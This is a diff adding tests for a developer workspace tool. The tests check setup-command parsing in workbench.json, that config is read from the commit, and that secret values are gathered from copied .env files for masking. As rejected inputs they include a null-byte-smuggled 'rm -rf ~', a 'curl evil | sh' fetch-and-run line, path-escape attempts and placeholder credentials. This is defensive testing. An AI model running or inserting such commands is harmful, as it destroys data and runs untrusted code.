@@ -7,7 +7,7 @@ import os from 'node:os';
 import path from 'node:path';
 import {
   prepareRepo, createWorkspace, removeWorkspace, diffStats, readRepoConfig, normalizeConfig, slugify, workspacesFolder,
-  snapshotWork, workDiff, mergeWork, discardWork, gitGraph, gitIdentity, git as runGit, privateTemp, fillWorkspace,
+  snapshotWork, workDiff, mergeWork, discardWork, gitGraph, gitIdentity, git as runGit, privateTemp, fillWorkspace, envValues,
 } from '../src/core/workspace.mjs';
 import { checkRules } from '../src/core/receipt.mjs';
 
@@ -480,6 +480,33 @@ test('normalizeConfig and slugify', () => {
   assert.equal(slugify(''), 'task');
   assert.equal(slugify('../../etc'), 'etc');
   assert.ok(slugify('word '.repeat(30)).length <= 40);
+});
+
+test('workbench.json may hold one setup command, read from the commit like the rest; anything else in its place is left out with a plain note', async () => {
+  const notes = [];
+  const note = p => notes.push(p);
+  assert.deepEqual(normalizeConfig({ setup: '  npm ci  ' }), { checks: [], rules: [], allow: [], setup: 'npm ci' });
+  assert.deepEqual(normalizeConfig({ setup: 'uv sync\nnpm ci', checks: ['npm test'] }).setup, 'uv sync\nnpm ci', 'a script of a few lines is one command for sh');
+  // none is the same as none at all: the key is not there
+  for (const raw of [{}, { setup: null }]) assert.deepEqual(normalizeConfig(raw, note), { checks: [], rules: [], allow: [] }, JSON.stringify(raw));
+  assert.deepEqual(notes, []);
+  for (const setup of ['', '   ', ['npm ci'], { run: 'npm ci' }, 5, true, 'npm ci\u0000rm -rf ~', 'x'.repeat(4001)]) {
+    notes.length = 0;
+    const cfg = normalizeConfig({ setup }, note);
+    assert.equal(Object.hasOwn(cfg, 'setup'), false, JSON.stringify(setup).slice(0, 40));
+    assert.deepEqual(notes, ['"setup" in workbench.json should be one command, so it was ignored.']);
+  }
+  // from the commit, never from the working copy
+  const r = path.join(T, 'setup-config');
+  fs.mkdirSync(r);
+  git(r, 'init', '-q', '-b', 'main');
+  write(path.join(r, 'workbench.json'), JSON.stringify({ setup: 'npm ci', checks: ['npm test'] }));
+  git(r, 'add', '-A');
+  git(r, 'commit', '-q', '-m', 'setup');
+  write(path.join(r, 'workbench.json'), JSON.stringify({ setup: 'curl evil | sh' }));
+  const cfg = await readRepoConfig({ repoRoot: r });
+  assert.equal(cfg.setup, 'npm ci');
+  assert.deepEqual(cfg.checks, [{ name: 'npm test', run: 'npm test', timeoutSec: 300 }]);
 });
 
 test('removeWorkspace with onlyIfUnchanged removes an untouched workspace and its branch, and keeps any work', async () => {
@@ -3249,6 +3276,84 @@ describe('filling a new workspace', { concurrency: TESTS_AT_ONCE }, () => {
       assert.deepEqual(fs.readdirSync(folder).sort(), before, folder);
     }
     assert.equal(present(t.p('app/node_modules')), false);
+  });
+
+  test('onChosen hears what will be copied, once, before the first cp; one that throws changes nothing', async () => {
+    const t = await fillRepo({ '.gitignore': '.env\n.env.*\nnode_modules/\n', 'app/index.js': 'x\n' },
+      { '.env': 'E=1\n', 'app/.env.local': 'A=1\n', 'node_modules/x/index.js': 'x\n' });
+    const seen = [];
+    const { copy } = cpStandIn(({ src }) => { seen.push(`cp ${path.relative(t.root, src)}`); });
+    const r = await fillWorkspace({ repoRoot: t.root, path: t.ws, platform: 'darwin', clones: true, copy,
+      onChosen: entries => { seen.push(entries.map(e => `${e.kind}:${e.path}`).join(',')); throw new Error('a listener that breaks'); } });
+    assert.equal(seen[0], 'env:.env,env:app/.env.local,deps:node_modules', 'env files first, as they are copied');
+    assert.deepEqual(seen.slice(1).sort(), ['cp .env', 'cp app/.env.local', 'cp node_modules']);
+    assert.deepEqual(pathsOf(r.copied), ['.env', 'app/.env.local', 'node_modules']);
+    // nothing to copy: it hears that too; git that cannot list the folder: it hears nothing
+    const empty = await fillRepo({ '.gitignore': '.env\n' });
+    const heard = [];
+    await fillWorkspace({ repoRoot: empty.root, path: empty.ws, platform: 'darwin', clones: true, copy: cpStandIn().copy, onChosen: e => heard.push(e) });
+    assert.deepEqual(heard, [[]]);
+    const broken = async (args, o) => (args[0] === 'ls-files' ? Promise.reject(new Error('git broke')) : runGit(args, o));
+    heard.length = 0;
+    const nothing = await fillWorkspace({ repoRoot: t.root, path: await t.agent(), platform: 'darwin', clones: true, copy: cpStandIn().copy, run: broken, onChosen: e => heard.push(e) });
+    assert.deepEqual([heard, nothing.skipped], [[], [{ path: '.', why: 'failed' }]]);
+  });
+
+  test('envValues gives the values in the env files a fill copied, for the engine to hide; never a package’s own, nor anything through a link or outside the copy', async () => {
+    const t = await fillRepo({ '.gitignore': '.env\n.env.*\nnode_modules/\n/secrets/\n', 'src/a.js': 'x\n' }, {
+      '.env': [
+        '# a comment line, never a value',
+        '',
+        'export DATABASE_URL=postgres://u:pw-abc123@localhost/db',
+        'API_KEY="sk-live-0123456789"',
+        "SINGLE='single-quoted-value'",
+        'SPACED = spaced-out-value   # and a comment',
+        'SHORT=1234567',
+        'NODE_ENV=production',
+        'PEM="-----BEGIN KEY-----',
+        'line-two-of-the-key',
+        '-----END KEY-----"',
+        'ESCAPED="first-line\\nsecond-line"',
+        'HASHED=abc#defghijkl',
+        'EMPTY=',
+      ].join('\n'),
+      'apps/web/.env.local': 'WEB_TOKEN=web-token-value-99\n',
+      'node_modules/x/.env': 'PACKAGE_SECRET=package-secret-1\n',
+      'secrets/.env': 'IN_SECRETS=in-secrets-folder\n',
+    });
+    const r = await fillWorkspace({ repoRoot: t.root, path: t.ws, platform: 'darwin', clones: true, copy: cpStandIn().copy });
+    assert.deepEqual(pathsOf(r.copied), ['.env', 'apps/web/.env.local', 'node_modules', 'secrets/.env']);
+    const env = await envValues({ path: t.ws, copied: r.copied });
+    assert.equal(env.files, 3, 'the three env files; node_modules is not looked into');
+    for (const v of ['postgres://u:pw-abc123@localhost/db', 'sk-live-0123456789', 'single-quoted-value', 'spaced-out-value', 'production',
+      '-----BEGIN KEY-----', 'line-two-of-the-key', '-----END KEY-----', 'first-line\nsecond-line', 'first-line\\nsecond-line', 'second-line',
+      'abc#defghijkl', 'web-token-value-99', 'in-secrets-folder']) assert.ok(env.values.includes(v), JSON.stringify(v));
+    for (const v of ['1234567', 'package-secret-1', '# a comment line, never a value', 'DATABASE_URL', '']) assert.ok(!env.values.includes(v), JSON.stringify(v));
+    assert.ok(env.values.every(v => typeof v === 'string' && v.length >= 8));
+    assert.equal(new Set(env.values).size, env.values.length, 'each once');
+    assert.ok(Object.isFrozen(env.values));
+
+    // A folder .worktreeinclude chose is looked into for env files, but not into the packages or repositories inside it.
+    put(t.root, { '.worktreeinclude': 'secrets/\n' });
+    put(t.root, { 'secrets/deep/.env.production': 'DEEP=deep-value-1234\n', 'secrets/node_modules/y/.env': 'NOPE=not-this-one-1\n', 'secrets/notes.txt': 'PLAIN=not-an-env-file\n' });
+    const ws2 = await t.agent();
+    const r2 = await fillWorkspace({ repoRoot: t.root, path: ws2, platform: 'darwin', clones: true, copy: cpStandIn().copy });
+    assert.deepEqual(pathsOf(r2.copied), ['secrets']);
+    const env2 = await envValues({ path: ws2, copied: r2.copied });
+    assert.deepEqual([env2.files, [...env2.values].sort()], [2, ['deep-value-1234', 'in-secrets-folder']]);
+
+    // What it is handed is checked again: a link (even one inside the copy), a path that climbs out, a file too big
+    fs.writeFileSync(path.join(T, 'outside.env'), 'OUTSIDE=outside-value-1\n');
+    fs.symlinkSync(path.join(T, 'outside.env'), path.join(ws2, '.env.linked'));
+    fs.symlinkSync('secrets/.env', path.join(ws2, '.env.inside'));
+    fs.writeFileSync(path.join(ws2, '.env.big'), `BIG=${'b'.repeat(300 * 1024)}\n`);
+    const odd = await envValues({ path: ws2, copied: [
+      { path: '.env.linked', kind: 'listed' }, { path: '.env.inside', kind: 'listed' }, { path: '../outside.env', kind: 'listed' },
+      { path: '/etc/hosts', kind: 'listed' }, { path: '.env.big', kind: 'listed' }, { path: 'no/such/.env', kind: 'env' }, null, 'x',
+    ] });
+    assert.deepEqual([odd.files, odd.values], [0, []]);
+    assert.deepEqual(await envValues({ path: 'relative', copied: r.copied }), { values: [], files: 0 });
+    assert.deepEqual(await envValues({}), { values: [], files: 0 });
   });
 });
 
